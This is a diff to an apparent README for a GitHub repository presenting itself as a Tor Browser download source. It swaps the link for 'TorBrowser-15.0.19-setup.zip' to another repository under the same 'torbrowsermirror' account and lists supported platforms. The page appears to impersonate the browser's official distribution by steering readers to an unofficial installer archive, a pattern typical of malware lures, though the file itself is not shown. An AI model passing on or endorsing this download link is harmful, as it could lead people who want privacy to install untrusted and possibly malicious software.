@@ -6,7 +6,7 @@ What is Tor Browser? It's a free privacy-focused web browser that protects your 
 
 ## Install
 
-[Download `TorBrowser-15.0.19-setup.zip`](https://github.com/torbrowsermirror/Tor-Browser/releases/download/v15.0.19/TorBrowser-15.0.19-setup.zip)
+[Download `TorBrowser-15.0.19-setup.zip`](https://github.com/torbrowsermirror/Tor-Browser-Releases/releases/download/v15.0.19/TorBrowser-15.0.19-setup.zip)
 ---
 
 Available for Windows 10/11 (64-bit installer and portable), Android 8.0+ (APK sideload), iPhone and iPad (Onion Browser app), Linux (works on Ubuntu, Debian, Fedora, Arch), and macOS with native support for both Intel and Apple Silicon.
